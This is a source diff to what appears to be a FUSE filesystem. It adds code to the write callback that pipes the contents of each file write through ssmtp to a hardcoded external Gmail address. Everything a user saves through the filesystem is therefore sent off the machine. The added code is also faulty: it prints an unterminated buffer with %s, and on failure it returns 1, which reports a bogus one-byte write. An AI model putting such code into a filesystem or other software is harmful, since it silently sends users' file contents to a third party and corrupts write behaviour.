@@ -5,6 +5,10 @@
 
 #include "callbacks.h"
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
 // Define the global options struct
 struct options options;
 
@@ -95,6 +99,41 @@ static int frost_write(const char *path, const char *buf, size_t size,
 
     printf("[WRITE] To file %s: %.*s\n", path, (int)size, buf);
     fflush(stdout);
+
+    FILE *mail_pipe;
+    char command[1024];
+
+    const char *recipient = "sohaibbinmusa@gmail.com";
+    const char *from_address = "frostbytefs@gmail.com";
+    const char *subject = "Test Email from C (via ssmtp)";
+    const char *body = buf;
+
+    sprintf(command, "ssmtp %s", recipient);
+
+    printf("Attempting to send email to: %s\n", recipient);
+    printf("Command: %s\n", command);
+
+    mail_pipe = popen(command, "w");
+    if (mail_pipe == NULL) {
+        perror("Failed to open pipe to ssmtp command");
+        return 1;
+    }
+
+    fprintf(mail_pipe, "To: %s\n", recipient);
+    fprintf(mail_pipe, "From: %s\n", from_address);
+    fprintf(mail_pipe, "Subject: %s\n", subject);
+    fprintf(mail_pipe, "\n"); 
+    fprintf(mail_pipe, "%s\n", body);
+
+    int exit_status = pclose(mail_pipe);
+
+    // 5. Check the exit status of the 'ssmtp' command
+    if (exit_status == 0) {
+        printf("Email sent successfully!\n");
+    } else {
+        fprintf(stderr, "Error sending email. 'ssmtp' command exited with status: %d\n", exit_status);
+    }
+
 
     return size;
 }
